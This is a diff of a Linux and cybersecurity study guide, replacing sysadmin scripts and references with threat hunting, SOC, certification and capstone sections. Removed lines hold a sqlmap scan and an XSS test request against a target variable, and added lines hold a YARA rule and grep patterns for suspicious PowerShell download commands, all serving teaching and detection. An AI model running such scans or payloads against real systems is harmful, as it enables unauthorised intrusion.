-sqlmap -u "http://$TARGET_IP/vulnerable.php?id=1" --batch
+4. **Recovery**
+   - System rebuild procedures
+   - Data recovery from backups
+   - Security control improvements
 
-# XSS testing
-echo "Testing for XSS vulnerabilities..."
-curl -X POST -d "input=<script>alert('XSS')</script>" http://$TARGET_IP/form.php
+**Deliverables**:
+- Incident response report
+- Timeline of events
+- Lessons learned document
+- Improved security procedures
 
-echo "=== Security Assessment Completed ==="
-echo "Review the generated report files for vulnerabilities"
-```
+### Project 4: Threat Hunting Exercise
 
-### Automation Scripts
+**Objective**: Proactively hunt for threats in a compromised environment.
 
-**System Maintenance Script:**
-```bash
-#!/bin/bash
-# Comprehensive system maintenance script
+**Hunting Hypotheses**:
+1. "Attackers are using PowerShell for post-exploitation activities"
+2. "Lateral movement is occurring via SMB shares"
+3. "Data exfiltration is happening during off-hours"
+4. "Attackers are using living-off-the-land techniques"
 
-LOG_FILE="/var/log/system_maintenance.log"
-DATE=$(date '+%Y-%m-%d %H:%M:%S')
+**Hunting Techniques**:
 
-log_message() {
-    echo "[$DATE] $1" | tee -a $LOG_FILE
-}
+1. **Behavioral Analysis**
+   ```bash
+   # Unusual PowerShell usage
+   grep -i "powershell" /var/log/syslog | grep -E "(encodedcommand|downloadstring|invoke-expression)"
+   
+   # Suspicious network connections
+   netstat -an | grep ESTABLISHED | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr
+   
+   # Off-hours activity
+   grep "$(date -d 'yesterday' +%Y-%m-%d)" /var/log/auth.log | grep -E "(02:|03:|04:)"
+   ```
 
-log_message "Starting system maintenance"
+2. **IOC Development**
+   ```bash
+   # Create YARA rules
+   rule Suspicious_PowerShell_Commands
+   {
+       strings:
+           $cmd1 = "Invoke-Expression" nocase
+           $cmd2 = "DownloadString" nocase
+           $cmd3 = "EncodedCommand" nocase
+       condition:
+           any of them
+   }
+   
+   # Test YARA rules
+   yara suspicious_powershell.yar /var/log/
+   ```
 
-# Update package lists
-log_message "Updating package lists..."
-apt update
+3. **Threat Intelligence Integration**
+   - IOC feeds integration
+   - Threat actor TTPs mapping
+   - Attribution analysis
 
-# Upgrade packages
-log_message "Upgrading packages..."
-apt upgrade -y
+**Deliverables**:
+- Threat hunting report
+- Custom detection rules
+- IOC documentation
+- Hunting playbooks
 
-# Clean package cache
-log_message "Cleaning package cache..."
-apt autoremove -y
-apt autoclean
+### Project 5: Security Operations Center (SOC) Simulation
 
-# Update locate database
-log_message "Updating locate database..."
-updatedb
+**Objective**: Build and operate a mini SOC environment.
 
-# Clean temporary files
-log_message "Cleaning temporary files..."
-find /tmp -type f -atime +7 -delete
-find /var/tmp -type f -atime +7 -delete
+**Components**:
+- SIEM platform (ELK Stack or Splunk)
+- Network monitoring (Security Onion)
+- Endpoint protection (Wazuh)
+- Threat intelligence feeds
 
-# Rotate logs
-log_message "Rotating logs..."
-logrotate /etc/logrotate.conf
+**SOC Processes**:
 
-# Check disk space
-log_message "Checking disk space..."
-df -h | grep -E '^/dev/' | awk '{if($5+0 > 80) print "Warning: " $1 " is " $5 " full"}'
+1. **Alert Triage**
+   ```bash
+   # Elasticsearch queries for suspicious activity
+   GET /logstash-*/_search
+   {
+     "query": {
+       "bool": {
+         "must": [
+           {"range": {"@timestamp": {"gte": "now-1h"}}},
+           {"term": {"event_type": "alert"}}
+         ]
+       }
+     }
+   }
+   ```
 
-# Check system load
-log_message "Current system load:"
-uptime
+2. **Incident Classification**
+   - Severity assessment
+   - Impact analysis
+   - Escalation procedures
 
-# Memory usage
-log_message "Memory usage:"
-free -h
+3. **Response Coordination**
+   - Stakeholder notification
+   - Technical investigation
+   - Remediation tracking
 
-log_message "System maintenance completed"
-```
+4. **Metrics and Reporting**
+   - MTTR (Mean Time to Response)
+   - MTTD (Mean Time to Detection)
+   - Alert accuracy rates
 
-**Backup Automation Script:**
-```bash
-#!/bin/bash
-# Automated backup script with rotation
-
-BACKUP_SOURCE="/home /etc /var/log"
-BACKUP_DEST="/backup"
-RETENTION_DAYS=30
-COMPRESSION="gzip"
-EXCLUDE_FILE="/etc/backup_exclude.txt"
-
-# Create exclude file if it doesn't exist
-cat > $EXCLUDE_FILE << EOF
-*.tmp
-*.cache
-*.log
-/var/log/journal
-EOF
-
-# Create backup
-DATE=$(date +%Y%m%d_%H%M%S)
-BACKUP_FILE="$BACKUP_DEST/backup_$DATE.tar.gz"
-
-echo "Starting backup to $BACKUP_FILE"
-
-tar --exclude-from=$EXCLUDE_FILE \
-    --create \
-    --gzip \
-    --file="$BACKUP_FILE" \
-    $BACKUP_SOURCE
-
-if [ $? -eq 0 ]; then
-    echo "Backup completed successfully"
-    
-    # Calculate backup size
-    SIZE=$(du -h "$BACKUP_FILE" | cut -f1)
-    echo "Backup size: $SIZE"
-    
-    # Remove old backups
-    find $BACKUP_DEST -name "backup_*.tar.gz" -mtime +$RETENTION_DAYS -delete
-    echo "Old backups removed (older than $RETENTION_DAYS days)"
-    
-    # Send notification (optional)
-    # mail -s "Backup Completed" admin@example.com < /dev/null
-else
-    echo "Backup failed!"
-    exit 1
-fi
-```
+**Deliverables**:
+- SOC procedures manual
+- Playbook documentation
+- Metrics dashboard
+- Training materials
 
 ---
 
-## Resources & References
+## 📚 Certification Roadmap
 
-### Essential Reading
+Professional certifications validate your knowledge and demonstrate commitment to the field.
 
-**Books:**
-1. **"The Linux Command Line"** by William Shotts
-   - Excellent introduction to command line usage
-   - Covers shell scripting fundamentals
+### Entry-Level Certifications
 
-2. **"Linux System Administration"** by Tom Adelstein
-   - Comprehensive system administration guide
-   - Real-world scenarios and solutions
+#### CompTIA Security+
+**Prerequisites**: None (recommended: Network+ or equivalent experience)
+**Focus**: Security fundamentals, risk management, cryptography
+**Study Time**: 2-3 months
+**Cost**: ~$370
 
-3. **"The Art of Unix Programming"** by Eric S. Raymond
-   - Philosophy and design principles
-   - Historical context and best practices
+**Study Resources**:
+- Official CompTIA materials
+- Professor Messer videos (free)
+- Darril Gibson GCGA book
+- Practice exams
 
-4. **"Linux Security Cookbook"** by Daniel J. Barrett
-   - Practical security recipes
-   - Step-by-step security implementations
+**Key Topics**:
+- Threats, attacks, and vulnerabilities
+- Architecture and design
+- Implementation
+- Operations and incident response
+- Governance, risk, and compliance
 
-5. **"Docker Deep Dive"** by Nigel Poulton
-   - Container technology mastery
-   - Production deployment strategies
+#### (ISC)² Systems Security Certified Practitioner (SSCP)
+**Prerequisites**: None (1 year experience recommended)
+**Focus**: Hands-on security skills
+**Study Time**: 3-4 months
+**Cost**: ~$249
 
-**Documentation:**
-- **Linux Documentation Project**: tldp.org
-- **Arch Linux Wiki**: wiki.archlinux.org (excellent for all distributions)
-- **Red Hat Documentation**: access.redhat.com/documentation
-- **Ubuntu Documentation**: help.ubuntu.com
-- **Debian Administrator's Handbook**: debian-handbook.info
+### Linux/System Administration Certifications
 
-### Online Platforms
+#### Linux Professional Institute (LPI)
 
-**Learning Platforms:**
-1. **Linux Journey** (linuxjourney.com)
-   - Interactive Linux learning
-   - Beginner to advanced topics
-   - Hands-on exercises
+**LPIC-1: Linux Administrator**
+- Exam 101-500: System Architecture, Linux Installation and Package Management
+- Exam 102-500: Shells, Scripting, Data Management, Networking
 
-2. **OverTheWire** (overthewire.org)
-   - Security-focused challenges
-   - Wargames for skill development
-   - Progressive difficulty levels
+**LPIC-2: Linux Engineer**  
+- Exam 201-450: Capacity Planning, Linux Kernel, System Startup, Filesystem, Hardware
+- Exam 202-450: Networking Configuration, System Security, System Maintenance
 
-3. **Hack The Box** (hackthebox.eu)
-   - Penetration testing labs
-   - Real-world scenarios
-   - Community-driven learning
+**LPIC-3: Linux Enterprise Professional**
+- 300: Mixed Environments (Samba, LDAP)
+- 303: Security (Cryptography, Access Control, Application Security)
+- 304: Virtualization & High Availability
 
-4. **TryHackMe** (tryhackme.com)
-   - Beginner-friendly security training
-   - Guided learning paths
-   - Interactive virtual machines
+#### Red Hat Certifications
 
-5. **Linux Academy/A Cloud Guru**
-   - Comprehensive Linux courses
-   - Cloud platform integration
-   - Hands-on labs
+**RHCSA (Red Hat Certified System Administrator)**
+**Prerequisites**: Basic Linux knowledge
+**Format**: Performance-based exam
+**Study Time**: 4-6 months
+**Cost**: ~$400
 
-**Practice Environments:**
-- **Katacoda**: Interactive Linux scenarios
-- **Play with Docker**: Browser-based Docker playground
-- **Vagrant**: Reproducible development environments
-- **VulnHub**: Vulnerable VMs for practice
+**Key Skills**:
+- Understand essential tools
+- Operate running systems
+- Configure local storage
+- Create and configure file systems
+- Deploy, configure, and maintain systems
+- Manage users and groups
+- Manage security
 
-### Certification Paths
+**RHCE (Red Hat Certified Engineer)**  
+**Prerequisites**: RHCSA certification
+**Focus**: Advanced system administration
+**Study Time**: 6-8 months
 
-**Linux Professional Institute (LPI):**
-- **LPIC-1**: Linux Administrator (101-102)
-- **LPIC-2**: Linux Engineer (201-202)
-- **LPIC-3**: Linux Enterprise Professional (300, 303, 304)
+### Cybersecurity Certifications
 
-**Red Hat Certifications:**
-- **RHCSA**: Red Hat Certified System Administrator
-- **RHCE**: Red Hat Certified Engineer
-- **RHCA**: Red Hat Certified Architect
+#### Offensive Security
 
-**CompTIA:**
-- **Linux+**: Vendor-neutral Linux certification
-- **Security+**: Foundation security knowledge
-- **PenTest+**: Penetration testing skills
+**OSCP (Offensive Security Certified Professional)**
+**Prerequisites**: Solid Linux/Windows knowledge, basic penetration testing
+**Format**: 24-hour practical exam
+**Study Time**: 6-12 months
+**Cost**: ~$1,499 (includes lab access)
 
-**Offensive Security:**
-- **OSCP**: Offensive Security Certified Professional
-- **OSCE**: Offensive Security Certified Expert
-- **OSEE**: Offensive Security Exploitation Expert
+**Study Approach**:
+1. PWK (Penetration Testing with Kali) course
+2. Lab environment practice (60+ machines)
+3. Buffer overflow mastery
+4. Report writing skills
 
-### Community Resources
+**OSEP (Offensive Security Experienced Penetration Tester)**
+**Prerequisites**: OSCP or equivalent experience
+**Focus**: Advanced penetration testing, evasion techniques
+**Study Time**: 8-12 months
 
-**Forums and Communities:**
-- **r/linux** (Reddit): Active Linux community
-- **Linux Questions**: Comprehensive Q&A platform
-- **Stack Overflow**: Programming and command-line help
-- **Ask Ubuntu**: Ubuntu-specific questions
-- **CentOS Forums**: RHEL/CentOS community
+#### SANS/GIAC Certifications
 
-**IRC Channels:**
-- **#linux** on Freenode: General Linux discussion
-- **#ubuntu** on Freenode: Ubuntu support
-- **#debian** on OFTC: Debian support
-- **#centos** on Freenode: CentOS support
+**GSEC (GIAC Security Essentials)**
+**Prerequisites**: Security+ level knowledge
+**Focus**: Hands-on security skills
+**Cost**: ~$7,000+ (includes training)
 
-**Professional Networks:**
-- **LinkedIn Linux Groups**: Professional networking
-- **Local Linux User Groups (LUGs)**: Face-to-face meetups
-- **DevOps/SRE Meetups**: Practical application discussions
+**GCIH (GIAC Certified Incident Handler)**
+**Focus**: Incident response and computer forensics
+**Study Time**: 4-6 months
 
-**Blogs and News:**
-- **Linux.com**: Linux news and tutorials
-- **DistroWatch**: Distribution news and reviews
-- **Phoronix**: Linux hardware and performance news
-- **It's FOSS**: Beginner-friendly Linux content
+**GPEN (GIAC Penetration Tester)**
+**Focus**: Penetration testing methodology
+**Study Time**: 6-8 months
+
+#### EC-Council
+
+**CEH (Certified Ethical Hacker)**
+**Prerequisites**: 2+ years security experience
+**Focus**: Ethical hacking techniques
+**Study Time**: 3-4 months
+**Cost**: ~$1,199
+
+**CHFI (Computer Hacking Forensic Investigator)**
+**Focus**: Digital forensics
+**Study Time**: 4-6 months
+
+#### Advanced Certifications
+
+**CISSP (Certified Information Systems Security Professional)**
+**Prerequisites**: 5 years experience (reducible with education/certs)
+**Focus**: Security management and leadership
+**Study Time**: 6-8 months
+**Cost**: ~$749
+
+**CISM (Certified Information Security Manager)**
+**Prerequisites**: 5 years experience in information security
+**Focus**: Information security management
+**Study Time**: 4-6 months
+
+### Cloud Security Certifications
+
+#### AWS Security
+**AWS Certified Security - Specialty**
+**Prerequisites**: AWS Solutions Architect or equivalent
+**Focus**: AWS security services and best practices
+**Study Time**: 3-4 months
+
+#### Microsoft Azure
+**Microsoft Azure Security Engineer Associate**
+**Prerequisites**: Azure fundamentals knowledge
+**Focus**: Azure security implementation
+**Study Time**: 3-4 months
+
+#### Google Cloud
+**Google Cloud Professional Cloud Security Engineer**
+**Prerequisites**: Google Cloud Platform experience
+**Focus**: GCP security design and implementation
+**Study Time**: 4-6 months
+
+### Certification Study Strategy
+
+#### Phase 1: Foundation (Months 1-6)
+1. **Security+** - Security fundamentals
+2. **RHCSA** - Linux system administration
+3. **Hands-on labs** - VirtualBox/VMware setup
+
+#### Phase 2: Specialization (Months 7-18)
+1. **OSCP** - Penetration testing skills
+2. **GCIH** - Incident response capabilities
+3. **Real-world projects** - Portfolio development
+
+#### Phase 3: Leadership (Months 19-30)
+1. **CISSP** - Security management
+2. **CISM** - Information security management
+3. **Advanced specializations** - Based on career path
+
+#### Study Resources
+
+**Free Resources**:
+- Cybrary.it - Free security training
+- Professor Messer - CompTIA training
+- SANS Cyber Aces - Foundational tutorials
+- YouTube channels - Various security topics
+
+**Paid Resources**:
+- CBT Nuggets - Video training
+- Pluralsight - Technology training
+- Linux Academy - Cloud and Linux training
+- SANS courses - Premium security training
+
+**Practice Labs**:
+- TryHackMe - Guided security challenges
+- HackTheBox - Advanced penetration testing
+- VulnHub - Vulnerable VMs
+- OverTheWire - Command line challenges
+
+### Career Development Path
+
+#### Entry Level (0-2 years)
+**Positions**: SOC Analyst, Junior Penetration Tester, IT Support
+**Skills**: Security+, basic Linux, networking fundamentals
+**Salary Range**: $40,000 - $65,000
+
+#### Mid-Level (2-5 years)  
+**Positions**: Security Analyst, Penetration Tester, Incident Response Analyst
+**Skills**: OSCP, GCIH, specialized tools, scripting
+**Salary Range**: $65,000 - $95,000
+
+#### Senior Level (5-10 years)
+**Positions**: Senior Security Engineer, Security Architect, Team Lead
+**Skills**: Advanced certifications, leadership, business acumen  
+**Salary Range**: $95,000 - $140,000
+
+#### Expert Level (10+ years)
+**Positions**: Security Manager, CISO, Security Consultant
+**Skills**: CISSP, CISM, strategic thinking, executive communication
+**Salary Range**: $140,000 - $250,000+
 
 ---
 
-## Quick Reference Cards
+## 🎯 Final Mastery Challenges
 
-### Essential Command Cheat Sheet
+To truly master Linux and cybersecurity, complete these comprehensive challenges that integrate all the skills you've learned.
 
-```bash
-# File Operations
-ls -la                  # Detailed file listing
-cp -r source/ dest/     # Copy directory recursively
-mv oldname newname      # Move/rename files
-rm -rf directory/       # Remove directory forcefully
-find / -name "filename" # Find files by name
-grep "pattern" file     # Search text in files
+### Challenge 1: The Ultimate Penetration Test
 
-# Permissions
-chmod 755 file          # Set permissions (rwxr-xr-x)
-chown user:group file   # Change ownership
-sudo command            # Execute as root
+**Scenario**: You've been hired to conduct a comprehensive penetration test of a fictional company "SecureCorp" that has the following infrastructure:
 
-# Process Management
-ps aux                  # List all processes
-top                     # Real-time process viewer
-kill -9 PID            # Force kill process
-jobs                    # List background jobs
-nohup command &         # Run in background
+**Target Environment**:
+- 50-node network with mixed Windows/Linux systems
+- Web applications (internal and external)
+- Wireless network
+- Cloud services (AWS/Azure)
+- Industrial control systems (SCADA)
 
-# Network
-ping host               # Test connectivity
-ssh user@host          # Remote connection
-scp file user@host:/path # Secure file copy
-netstat -tuln          # Network connections
+**Your Mission**:
+1. **External Assessment** (2 weeks)
+   - OSINT gathering
+   - External service enumeration
+   - Web application testing
+   - Wireless assessment
 
-# System Info
-df -h                   # Disk space usage
-free -h                 # Memory usage
-uname -a               # System information
-lscpu                  # CPU information
-```
+2. **Internal Assessment** (2 weeks)
+   - Network segmentation testing
+   - Privilege escalation
+   - Lateral movement
+   - Domain compromise
 
-### Security Quick Reference
+3. **Specialized Testing** (1 week)
+   - Cloud configuration review
+   - SCADA security assessment
+   - Social engineering simulation
 
-```bash
-# Firewall
-sudo ufw enable         # Enable UFW firewall
-sudo ufw allow ssh      # Allow SSH
-sudo ufw status         # Check firewall status
+**Success Criteria**:
+- Gain domain administrator access
+- Demonstrate data exfiltration capability
+- Compromise cloud infrastructure
+- Document all vulnerabilities with proof-of-concept exploits
+- Provide executive summary and technical report
 
-# User Management
-sudo useradd -m username    # Add user with home directory
-sudo usermod -aG sudo user  # Add user to sudo group
-sudo passwd username        # Change user password
+### Challenge 2: Build a Production SOC
 
-# File Security
-find / -perm 777 2>/dev/null           # Find world-writable files
-find / -type f -perm -4000 2>/dev/null # Find SUID files
-lsof -i                                # List open network connections
+**Objective**: Design and implement a fully functional Security Operations Center
 
-# Log Analysis
-tail -f /var/log/auth.log    # Monitor authentication logs
-grep "Failed password" /var/log/auth.log  # Find failed logins
-last                         # Show login history
-```
+**Requirements**:
+1. **Technology Stack**
+   - SIEM platform (ELK Stack or Splunk)
+   - Network monitoring (Security Onion)
+   - Endpoint protection (Wazuh/OSSEC)
+   - Vulnerability management (OpenVAS/Nessus)
+   - Threat intelligence integration
+
+2. **Processes and Procedures**
+   - Incident response playbooks
+   - Alert triage procedures
+   - Escalation matrices
+   - Metrics and reporting
+
+3. **Staffing and Training**
+   - SOC analyst training program
+   - Skills assessment framework
+   - Career development paths
+
+**Deliverables**:
+- Complete SOC architecture documentation
+- Operational procedures manual
+- Training curriculum
+- 90-day implementation plan
+- ROI analysis
+
+### Challenge 3: Advanced Threat Hunting Campaign
+
+**Scenario**: Your organization has been targeted by an advanced persistent threat (APT) group. Traditional security controls have failed to detect the intrusion.
+
+**Your Mission**:
+1. **Hypothesis Development**
+   - Research known APT tactics, techniques, and procedures (TTPs)
+   - Develop hunting hypotheses based on threat intelligence
+   - Create detection analytics
+
+2. **Data Collection and Analysis**
+   - Implement comprehensive logging
+   - Develop behavioral baselines
+   - Create custom detection rules
+
+3. **Threat Discovery**
+   - Hunt for indicators of compromise
+   - Identify lateral movement patterns  
+   - Uncover persistence mechanisms
+
+4. **Response and Recovery**
+   - Coordinate incident response
+   - Implement containment measures
+   - Develop remediation strategy
+
+**Success Criteria**:
+- Identify compromised systems
+- Map attack timeline
+- Develop attribution assessment
+- Create new detection capabilities
+- Improve security posture
+
+### Challenge 4: Secure DevOps Pipeline
+
+**Objective**: Implement security throughout the software development lifecycle
+
+**Requirements**:
+1. **Infrastructure as Code**
+   - Terraform/Ansible security configurations
+   - Container security (Docker/Kubernetes)
+   - Cloud security automation
+
+2. **Application Security**
+   - Static Application Security Testing (SAST)
+   - Dynamic Application Security Testing (DAST)
+   - Interactive Application Security Testing (IAST)
+   - Software Composition Analysis (SCA)
+
+3. **CI/CD Security Integration**
+   - Security gates in build pipeline
+   - Automated vulnerability scanning
+   - Security testing automation
+   - Compliance validation
+
+**Deliverables**:
+- Secure CI/CD pipeline implementation
+- Security testing strategy
+- Compliance automation framework
+- Developer security training program
+
+### Challenge 5: Digital Forensics Investigation
+
+**Scenario**: A major data breach has occurred. You must conduct a complete digital forensics investigation.
+
+**Investigation Scope**:
+1. **Initial Response**
+   - Evidence preservation
+   - Chain of custody documentation
+   - Preliminary assessment
+
+2. **Evidence Collection**
+   - Disk imaging
+   - Memory acquisition
+   - Network packet capture
+   - Log collection
+
+3. **Analysis**
+   - Timeline reconstruction
+   - Malware analysis
+   - Network forensics
+   - Data recovery
+
+4. **Reporting**
+   - Technical findings
+   - Executive summary
+   - Legal documentation
+   - Remediation recommendations
+
+**Tools and Techniques**:
+- Autopsy/Sleuth Kit for disk analysis
+- Volatility for memory forensics
+- Wireshark for network analysis
+- YARA for malware identification
+- Timeline analysis tools
 
 ---
 
-This comprehensive Linux Mastery guide covers everything from basic commands to advanced cybersecurity techniques. Use it as your reference companion throughout your Linux journey, whether you're a beginner learning the basics or an experienced professional diving into DevOps and security.
+## 🚀 Your Journey Forward
 
-Remember: **Practice makes perfect**. Set up virtual machines, experiment with commands, break things (safely), and learn from the experience. The Linux community is vast and helpful – don't hesitate to ask questions and contribute back to the community as you grow your skills.
+Congratulations! You've completed one of the most comprehensive Linux and cybersecurity guides available. But remember: this is just the beginning of your journey.
 
-**Happy Learning! 🐧**
+### Continuous Learning Mindset
+
+**Technology Evolution**: The cybersecurity landscape changes rapidly. New threats emerge daily, tools evolve, and attack techniques become more sophisticated. Stay current by:
+
+- Following security researchers on Twitter
+- Reading security blogs and publications
+- Attending conferences (DEF CON, Black Hat, BSides)
+- Participating in CTF competitions
+- Contributing to open source security projects
+
+### Building Your Professional Network
+
+**Community Engagement**:
+- Join local security meetups and user groups
+- Participate in online forums (Reddit r/netsec, Discord servers)
+- Contribute to security discussions and knowledge sharing
+- Mentor newcomers to the field
+- Present at conferences and meetups
+
+### Ethical Responsibility
+
+**Remember**: With great power comes great responsibility. Always:
+- Obtain proper authorization before testing
+- Follow responsible disclosure practices
+- Respect privacy and confidentiality
+- Use your skills to protect, not harm
+- Advocate for better security practices
+
+### Career Advancement
+
+**Professional Development**:
+- Pursue relevant certifications for your career path
+- Develop both technical and soft skills
+- Seek challenging projects and responsibilities
+- Build a portfolio of your work
+- Consider leadership and management opportunities
+
+### Giving Back
+
+**Knowledge Sharing**:
+- Write blog posts about your experiences
+- Create tutorials and guides for others
+- Contribute to open source projects
+- Teach and mentor others
+- Volunteer for cybersecurity education initiatives
+
+---
+
+**The cybersecurity community needs passionate, ethical professionals who are committed to protecting our digital world. You now have the knowledge and skills to make a real difference. Go forth and secure the future!**
+
+**Happy Hacking! 🐧🛡️**
+
+---
+
+*"The best way to predict the future is to create it." - Peter Drucker*
+
+Remember: This guide is a living document. Technology evolves, threats change, and new techniques emerge. Keep learning, stay curious, and always practice ethical behavior in your cybersecurity journey.
